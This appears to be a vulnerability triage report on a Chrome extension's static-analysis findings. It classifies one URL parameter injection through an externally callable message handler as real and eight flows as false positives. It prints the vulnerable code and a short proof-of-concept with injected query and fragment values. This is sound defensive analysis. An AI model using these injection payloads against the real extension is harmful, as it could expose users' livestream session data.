# CoCo Analysis: elcjkpgnonncikmfpiileaolidghdhoa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 9 (1 TRUE POSITIVE, 8 FALSE POSITIVES)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elcjkpgnonncikmfpiileaolidghdhoa/opgen_generated_files/bg.js
Line 1362: request.timeDim
Line 1766: URL construction with timeDim parameter

**Code:**

```javascript
// Background script (bg.js) - Line 1283
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← external attacker can call

    // ... other handlers ...

    if (request.key === 'sync_past_livestream_session'){
      sync_past_livestream_session(request.timeDim, sendResponse); // ← attacker-controlled timeDim
      return true;
    }

    // ... more handlers ...
  }
);

// Line 1762-1773
async function sync_past_livestream_session(timeDim, send_response){
  var yesterday = new Date(Date.now() - 86400000);
  var yesterday_str = yesterday.toISOString().substring(0,10)

  // URL with attacker-controlled parameter
  var url = 'https://creator.shopee.vn/supply/api/lm/sellercenter/liveList/v2?page=1&pageSize=300&name=&orderBy=&sort=&timeDim=' + timeDim + '&endDate=' + yesterday_str; // ← parameter injection

  fetch(url)
    .then((response) => response.json())
    .then((result) => {
      console.log(result);
      send_response(result); // ← response sent back to attacker
    })
    .catch((error) => {console.error(error); send_response(error); })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain in manifest.json externally_connectable:
// https://localhost:*/* or https://*.inecom.club/*

chrome.runtime.sendMessage(
    "elcjkpgnonncikmfpiileaolidghdhoa",
    {
        key: "sync_past_livestream_session",
        timeDim: "7&malicious_param=value"  // Parameter injection
    },
    (response) => {
        console.log("Response from Shopee API:", response);
        // Attacker receives data from manipulated API call
    }
);

// More severe attack - inject URL fragments:
chrome.runtime.sendMessage(
    "elcjkpgnonncikmfpiileaolidghdhoa",
    {
        key: "sync_past_livestream_session",
        timeDim: "7#&endDate=ignored"  // Fragment injection to ignore endDate
    },
    (response) => {
        console.log("Manipulated response:", response);
    }
);
```

**Impact:** URL parameter injection vulnerability. External attackers from whitelisted domains can inject arbitrary parameters into the Shopee API request URL by manipulating the `timeDim` parameter. While the base domain (creator.shopee.vn) cannot be changed, attackers can inject additional query parameters or use URL fragments to manipulate the API request. The response from the manipulated API call is sent back to the attacker, potentially exposing sensitive livestream session data or allowing unauthorized API interactions.

---

## Sink 2-5: fetch_source → sendResponseExternal_sink (FALSE POSITIVES)

**CoCo Trace:**
Multiple instances at Lines 1023, 1066, 1102, 1142, 1758, 1844, 1853

**Classification:** FALSE POSITIVE

**Reason:** These flows involve fetching from hardcoded backend URLs (creator.shopee.vn, banhang.shopee.vn, shopee.vn) and returning responses via sendResponse. While the responses are sent to external callers, the data originates from legitimate Shopee API endpoints that the extension is designed to access. According to the methodology, data from hardcoded backend infrastructure is considered trusted. The extension is functioning as intended - acting as a bridge to Shopee's APIs for authorized external applications.

---

## Sink 6-9: cs_window_eventListener_message → fetch_resource_sink (FALSE POSITIVES)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elcjkpgnonncikmfpiileaolidghdhoa/opgen_generated_files/cs_4.js
Line 482: window.addEventListener("message")
Line 500: chrome.runtime.sendMessage(event.data)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elcjkpgnonncikmfpiileaolidghdhoa/opgen_generated_files/bg.js
Line 1257: request.session_id
Line 1269: URL construction

**Code:**

```javascript
// Content script (cs_4.js) - Line 482
window.addEventListener("message", (event) => {
    if(event.data.key == 'stop_scroll_livestream_items'){
        // ...
    } else {
      if(event.data != null){
        chrome.runtime.sendMessage(event.data); // ← forwards to background
      }
    }
}, false);

// Background (bg.js) - Line 1269
var api = "https://apidev.injoy.asia/api/LivestreamSessions?token=123&session_id=" + request.session_id;
fetch(api, requestOptions)
  .then((response) => response.text())
  .then((result) => console.log(result))
```

**Classification:** FALSE POSITIVE

**Reason:** While the content script accepts window.postMessage from the webpage and forwards data to the background script, the resulting fetch request goes to a hardcoded backend URL (https://apidev.injoy.asia) which is the developer's trusted infrastructure. The session_id parameter is concatenated into the URL, but the destination is the extension developer's own API server. According to the methodology, data sent TO hardcoded backend URLs is considered safe - compromising the developer's infrastructure is a separate issue from extension vulnerabilities.
